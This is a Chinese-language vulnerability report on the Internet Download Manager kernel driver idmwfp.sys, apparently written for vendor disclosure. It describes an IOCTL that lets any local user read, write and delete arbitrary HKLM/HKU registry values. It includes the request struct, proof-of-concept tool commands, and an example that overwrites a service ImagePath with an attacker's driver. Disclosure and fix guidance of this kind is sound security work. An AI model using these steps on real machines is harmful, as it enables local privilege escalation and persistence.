# Internet Download Manager `idmwfp.sys` 任意注册表读写导致本地提权漏洞

## 1. 摘要

`idmwfp.sys` 暴露了一个面向所有认证用户可访问的设备接口 `\\.\IDMWFP`。  
通过该接口的 `IOCTL 0x12C028` 及其子命令 `0x0C..0x0F`，低权限本地用户可以在**没有任何授权校验**的情况下，对 `HKLM` 和 `HKU` 下**任意路径**的注册表值执行：

- 读取
- 创建/修改
- 删除值
- 删除空 key

这不是仅限于 IDM 自身命名空间的配置接口，而是一个由内核驱动代理执行的、面向任意认证用户开放的注册表操作原语。  
由于该原语可以修改：

- `HKLM\\SYSTEM\\CurrentControlSet\\Services\\...`
- 其他被高权限服务、计划任务或系统组件信任的注册表路径

因此该问题可被用于：

- 本地权限提升（LPE）
- 以 `SYSTEM` 或内核上下文执行攻击者控制的代码/配置
- 高权限持久化
- 安全产品/系统配置篡改

从安全影响上看，这应当被视为一个**高危的内核驱动逻辑漏洞**，本质上属于“面向低权限用户暴露的任意受信任注册表读写能力”。

---

## 2. 厂商与受影响组件

- 厂商：Tonec / Internet Download Manager
- 受影响组件：`idmwfp.sys`
- 组件类型：Windows 内核驱动
- 设备接口：`\\.\IDMWFP`

已分析样本：

- MD5: `7d55ad6b428320f191ed8529701ac2fa`
- SHA-256: `753a1386e7b37ee313db908183afe7238f1a2aec5e6c1e59e9c11d471b6aaa8d`

---

## 3. 漏洞类型与评级建议

### 3.1 漏洞类型

- 本地权限提升（Local Privilege Escalation）
- 任意受信任注册表读写（Arbitrary Registry Read/Write/Delete）
- 内核驱动授权缺失 / 不安全设备访问控制

### 3.2 根因分类

建议 CWE：

- `CWE-862` Missing Authorization
- `CWE-732` Incorrect Permission Assignment for Critical Resource

### 3.3 建议 CVSS v3.1

建议初始评分：

- `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- 分值：`7.8`

说明：

- 攻击向量为本地
- 仅需普通低权限认证用户权限
- 不需要用户交互
- 可读取和修改高价值系统注册表路径
- 可导致高完整性破坏与持久化

如果厂商或评估方接受“通过篡改服务/驱动配置可稳定获得 `SYSTEM`/内核执行”这一利用链，则风险表述应进一步强调其实际 LPE 性质。

---

## 4. 受影响前提

攻击者仅需：

- 本地认证用户权限
- 能够打开 `\\.\IDMWFP`

不需要：

- 管理员权限
- `SeRestorePrivilege` / `SeLoadDriverPrivilege`
- 调试权限
- 交互式用户确认

---

## 5. 漏洞根因

### 5.1 设备对象对所有认证用户开放

在 `DriverEntry` 中，驱动创建：

- `\Device\IDMWFP`
- `\DosDevices\IDMWFP`

并使用安全描述符：

- `D:P(A;;GA;;;AU)`

其效果是：

- 所有认证用户（`AU`）拥有 `GENERIC_ALL`

这意味着任意普通本地用户都可以对该设备发送 `DeviceIoControl` 请求。

### 5.2 没有对目标注册表路径做授权边界限制

主控制面 `IRP_MJ_DEVICE_CONTROL` 分发函数为：

- `sub_14000E9E0`

其中：

- `IOCTL 0x12C028`
  - 首字节为子命令号
  - `0x0C..0x0F` 全部进入 `sub_140005B90`

`sub_140005B90` 会：

1. 从用户输入中解出“注册表相对路径 + value 名称”
2. 根据 `flags` 低位选择根前缀：
   - `flags & 0x1` -> `\\REGISTRY\\MACHINE\\`
   - `flags & 0x2` -> `\\REGISTRY\\USER\\`
3. 调用内核注册表 API：
   - `ZwOpenKey`
   - `ZwCreateKey`
   - `ZwDeleteValueKey`
   - `ZwDeleteKey`
   - `ZwQueryValueKey`
   - `ZwSetValueKey`

关键问题在于：

- 驱动**没有**限制路径必须位于 IDM 私有命名空间下
- 驱动**没有**校验调用者是否应有权限访问目标 key
- 驱动**没有**将操作限定到当前用户自己的 HKCU 映射

因此，该接口本质上允许普通用户通过内核驱动代理，对：

- `HKLM\...`
- `HKU\...`

执行任意路径级别的注册表读写删。

---

## 6. 技术细节

### 6.1 相关 IOCTL

主命令：

- `0x12C028`

其中与本漏洞直接相关的子命令：

- `0x0C`：查询 value
- `0x0D`：创建缺失 key 并设置 value
- `0x0E`：删除 value
- `0x0F`：删除 value，并在 key 为空时删除 key

### 6.2 公共输入结构

这 4 个子命令共用一套输入格式：

```c
#pragma pack(push, 1)
typedef struct IDMWFP_REG_CMD {
    uint8_t  subcmd;        // 0x0C / 0x0D / 0x0E / 0x0F
    uint8_t  mode;
    uint16_t reserved0;
    uint32_t flags;         // bit0 = HKLM, bit1 = HKU
    uint16_t path_offset;   // 指向“加密 UTF-16 路径”
    uint16_t path_wchars;   // 路径字符数
    uint16_t data_offset;   // 0x0D 使用
    uint16_t data_size;     // 0x0D 使用
    uint16_t value_type;    // 0x0D / 0x0C 使用
    uint8_t  seed0;
    uint8_t  seed1;
    // followed by:
    //   encoded_utf16_path[path_wchars]
    //   encoded_or_raw_data[data_size]
} IDMWFP_REG_CMD;
#pragma pack(pop)
```

路径字符串在驱动内会被解码，并在最后一个 `\` 处分割为：

- `key path`
- `value name`

因此，攻击者完全控制：

- 注册表根（HKLM / HKU）
- 相对 key 路径
- value 名称
- value 类型
- value 内容

### 6.3 已动态验证的行为

我已使用自写的 PoC 工具成功验证：

1. `0x0D` 在 `HKLM\SOFTWARE\IDMWFPProbe2\Val` 下写入 `REG_DWORD`
2. `0x0C` 读取该 value 并回显正确内容
3. `0x0E` 删除该 value
4. `0x0F` 删除空 key
5. `0x0D` 写入 `REG_EXPAND_SZ`
6. `0x0C` 成功读取并恢复字符串内容

这说明：

- 该接口不是理论上的“可能写”
- 而是已经实证可稳定用于**通用注册表操作**

---

## 7. 影响分析

### 7.1 任意 `HKLM` 写入

对低权限用户而言，最危险的是任意 `HKLM` 写入。

这允许攻击者篡改：

- `HKLM\SYSTEM\CurrentControlSet\Services\...`
- 各类高权限服务/驱动配置
- 高权限程序的启动参数、路径、依赖项、DLL 路径
- 安全产品、防护组件、系统策略相关键值

### 7.2 任意 `HKU` 访问

通过 `HKU\...` 根前缀，攻击者还可以：

- 读写其他用户 SID hive 下的配置
- 篡改跨用户环境中的登录后行为
- 建立更隐蔽的持久化

### 7.3 导致 LPE 的原因

该问题之所以不仅是“任意注册表写”，而是实质上的 LPE 风险，在于：

- 注册表是 Windows 高权限组件的核心配置来源
- 一旦低权限用户能改写高权限服务/驱动所信任的注册表项，就可以把自己控制的路径、参数或 DLL 注入到高权限执行链中

典型场景包括但不限于：

- 修改现有服务的 `ImagePath`
- 修改服务加载的 DLL/参数路径
- 修改驱动服务配置，等待系统重启或服务重启
- 篡改被 `SYSTEM` 或高完整性进程读取的关键配置项

即便在某个具体环境中，攻击者还需要“重启服务/等待系统重启/触发高权限组件读取配置”，这依然属于标准的本地提权利用链。

换句话说：

- 漏洞本体提供的是**高权限注册表原语**
- LPE 则是该原语的直接安全后果

---

## 8. 利用场景

### 场景 A：高权限服务配置篡改

普通用户可改写：

- `HKLM\SYSTEM\CurrentControlSet\Services\<Target>\ImagePath`

一旦目标服务后续被高权限上下文启动，即可能获得高权限代码执行。

### 场景 B：驱动服务路径篡改

普通用户可改写：

- 驱动服务的 `ImagePath`

在后续重启或重新加载时，可导向攻击者控制的二进制路径。

### 场景 C：安全配置破坏与高权限持久化

攻击者可通过修改：

- 安全产品配置
- 服务参数
- 系统组件配置

获得长效持久化或降低系统防护。

---

## 9. 复现步骤

### 9.1 环境

- Windows 系统
- `idmwfp.sys` 已加载
- 普通本地认证用户

### 9.2 最小 PoC：任意 `HKLM` 写入

使用我编写的工具：

- `idmwfp_reg_demo.exe`

写入 `REG_DWORD`：

```powershell
.\idmwfp_reg_demo.exe set-dword machine "SOFTWARE\IDMWFPProbe2\Val" 0x11223344
```

读取：

```powershell
.\idmwfp_reg_demo.exe query machine "SOFTWARE\IDMWFPProbe2\Val" 64
```

工具输出应包含：

```text
decoded: title_index=16 type=4 data_len=4
value(dword)=0x11223344
```

### 9.3 写入 `REG_EXPAND_SZ`

```powershell
.\idmwfp_reg_demo.exe set-expand-string machine "SOFTWARE\IDMWFPRegDemo\Path" "\SystemRoot\System32\drivers\Test.sys"
```

读取：

```powershell
.\idmwfp_reg_demo.exe query machine "SOFTWARE\IDMWFPRegDemo\Path" 256
```

工具输出应包含：

```text
type=2
value(expand_sz)=\SystemRoot\System32\drivers\Test.sys
```

### 9.4 删除 value 与 key

```powershell
.\idmwfp_reg_demo.exe del-value machine "SOFTWARE\IDMWFPProbe2\Val"
.\idmwfp_reg_demo.exe del-key machine "SOFTWARE\IDMWFPProbe2\Val"
```

这证明：

- 普通用户不仅能写，还能清理或破坏关键配置路径

### 9.5 高危路径示例

例如攻击者可尝试写入：

```powershell
.\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\<Target>\ImagePath" "\SystemRoot\System32\drivers\Attacker.sys"
```

这类路径位于：

- `HKLM\SYSTEM\CurrentControlSet\Services\...`

明显超出了 IDM 合法配置范围。

---

## 10. 根因总结

漏洞成立需要两个条件同时满足，而该驱动两者全部满足：

1. 设备对象对所有认证用户开放  
2. IOCTL 中对高权限注册表路径的操作没有授权和命名空间限制

本质上，这是一个：

- “低权限用户可调用的内核代理注册表接口”

而不是一个：

- “仅服务 IDM 自身配置的受限接口”

---

## 11. 安全建议

至少应修复以下问题：

### 11.1 收紧设备 ACL

不应使用：

- `D:P(A;;GA;;;AU)`

建议仅允许：

- 管理员
- `SYSTEM`
- IDM 自有服务 SID

### 11.2 对路径做白名单约束

`subcmd 0x0C..0x0F` 应强制限制到 IDM 自身命名空间，例如：

- `HKLM\SOFTWARE\Wow6432Node\Internet Download Manager\...`
- 或厂商明确允许的极小集合

绝不应允许调用者传任意相对路径。

### 11.3 增加调用者授权校验

即使路径在允许范围内，也应验证：

- 调用者 SID / Token
- 是否为受信任服务
- 是否具有管理员权限

### 11.4 禁止普通用户访问 `HKLM` / `HKU` 泛化根

尤其不应让普通用户通过内核代理绕过正常 ACL。

---

## 12. 结论

这是一个高危内核驱动逻辑漏洞。  
`idmwfp.sys` 通过对所有认证用户开放的 IOCTL 接口，向低权限用户暴露了一个可操作 `HKLM` 和 `HKU` 任意路径的内核注册表读写能力。

这类能力本身就足以被视为：

- 安全边界破坏
- 高危本地提权原语
- 高权限持久化原语

从防守角度看，这不应被降级为“仅配置问题”或“仅产品内私有接口误用”，因为：

- 受影响命名空间不是 IDM 私有路径
- 实际操作对象是系统级高价值注册表根
- 普通用户已经可以稳定复现

因此建议厂商尽快修复，并建议将其作为一例**内核驱动导致的本地提权/任意注册表读写漏洞**进行处理。

---

## 13. 附件与材料

本地已准备：

- 综合协议说明  
  - [idmwfp_ioctl_protocol.md](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_ioctl_protocol.md>)

- 综合审计报告  
  - [idmwfp_audit_report.md](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_audit_report.md>)

- 注册表专项 PoC  
  - [idmwfp_reg_demo.cpp](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_reg_demo.cpp>)
  - [idmwfp_reg_demo.exe](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_reg_demo.exe>)

- 主控制面 PoC  
  - [idmwfp_demo.cpp](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_demo.cpp>)
  - [idmwfp_demo.exe](</c:/Users/KnCRJVirX/Desktop/IDM/idmwfp_demo.exe>)

